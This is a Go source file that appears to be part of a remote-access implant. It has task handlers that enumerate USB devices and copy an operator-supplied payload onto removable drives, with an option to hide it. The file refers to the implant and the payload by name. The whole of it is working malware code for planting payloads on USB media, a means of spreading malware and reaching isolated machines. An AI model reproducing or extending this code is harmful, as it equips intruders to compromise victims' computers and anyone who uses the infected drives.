//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
)

func handleUSBEnum(task Task, res *TaskResult) {
	_ = task
	out, err := usbEnum()
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = out
}

func handleUSBDrop(task Task, res *TaskResult) {
	src := strings.TrimSpace(task.Path)
	dest := strings.TrimSpace(task.Command)
	if src == "" {
		// Toolkit / one-arg dispatch: Command is the source, dest is first removable.
		src = dest
		dest = ""
	}
	if src == "" {
		res.Error = "usb_drop: source path required (refuses to copy the implant binary)"
		return
	}
	if exe, err := os.Executable(); err == nil {
		if sameFilePath(src, exe) {
			res.Error = "usb_drop: refused to copy the implant executable; pass an explicit payload path"
			return
		}
	}
	hide := strings.Contains(strings.ToLower(task.Data), "hide=1")
	out, err := usbDrop(src, dest, hide)
	if err != nil {
		res.Error = err.Error()
		return
	}
	res.Output = out
}

func sameFilePath(a, b string) bool {
	aa, errA := filepath.Abs(a)
	bb, errB := filepath.Abs(b)
	if errA != nil || errB != nil {
		return strings.EqualFold(filepath.Clean(a), filepath.Clean(b))
	}
	return strings.EqualFold(filepath.Clean(aa), filepath.Clean(bb))
}

func copyRegularFile(src, dst string) (int64, error) {
	in, err := os.Open(src)
	if err != nil {
		return 0, err
	}
	defer in.Close()
	st, err := in.Stat()
	if err != nil {
		return 0, err
	}
	if !st.Mode().IsRegular() {
		return 0, fmt.Errorf("source is not a regular file")
	}
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
	if err != nil {
		return 0, err
	}
	n, copyErr := io.Copy(out, in)
	closeErr := out.Close()
	if copyErr != nil {
		return n, copyErr
	}
	return n, closeErr
}

func usbDropDestName(src, destRoot string) string {
	name := filepath.Base(src)
	if name == "" || name == "." || name == string(filepath.Separator) {
		name = "payload.bin"
	}
	return filepath.Join(destRoot, name)
}
